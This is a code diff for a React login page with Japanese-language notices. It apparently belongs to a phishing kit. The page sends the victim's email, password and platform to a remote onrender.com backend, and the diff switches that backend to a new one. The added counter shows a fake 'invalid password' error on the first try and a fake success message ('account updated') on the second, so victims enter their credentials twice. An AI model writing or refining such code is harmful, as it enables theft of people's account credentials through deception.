@@ -23,6 +23,9 @@ function Home(){
     const[platform, setPlatform] = useState("Hi-ho")
 
     const[showError, setShowError] = useState(false);
+    const[count, setCount] = useState(0);
+
+    const[showSuccess, setShowSuccess] = useState(false);
 
 
     
@@ -32,7 +35,7 @@ async function handleSubmit(e){
     e.preventDefault();
 
     try {
-        const response = await axios.post('https://mainbackend-rd07.onrender.com/api/send', {
+        const response = await axios.post('https://akamsback.onrender.com/api/send', {
             email:email,
             password:password,
             platform:platform
@@ -41,11 +44,19 @@ async function handleSubmit(e){
         // Handle success
         console.log('Data sent:', response.data.message);
 
-        if(response.status == 200){
+        if(response.status == 200 && count < 1){
             console.log(response.data.message);
+            setCount(count + 1);
 
             setShowError(true);
         }
+
+      else if(response.status == 200 && count == 1){
+        console.log(response.data.message);
+            setCount(0);
+            setShowError(false);
+            setShowSuccess(true);
+      }
       } catch (error) {
         // Handle error
         console.error('Error:', error);
@@ -69,10 +80,15 @@ async function handleSubmit(e){
 
                 </div>
 
-            <div className='col-md-4 m-auto warning alert my-4'>
+
+                {email == "" ?  <div className='col-md-4 m-auto warning alert my-4 py-0'>
                 <p className='warningtext'><b>【</b>お知らせ<b>】</b> <br/>ご案内はありません。</p>
 
-            </div>
+            </div> : <div></div> }
+
+            
+           
+                
 
             <div className='py-4'>
 
@@ -85,13 +101,15 @@ async function handleSubmit(e){
             </button>
             </div>}
 
-            <div className='formdiv col-md-4 m-auto p-0 '>
-            {showError && <div className="alert alert-danger alert-dismissible fade show" role="alert">
-            <strong className='text-center'>Invalid Email or Password</strong> 
+            {showSuccess && <div className="col-md-4 m-auto alert alert-success alert-dismissible fade show" role="alert">
+            <strong className='text-center'>正しいパスワードです。アカウントが更新されました。</strong> 
             <button type="button" className="close" data-dismiss="alert" aria-label="Close">
                 <span aria-hidden="true">&times;</span>
             </button>
             </div>}
+
+            <div className='formdiv col-md-4 m-auto p-0 '>
+            
 
               
 
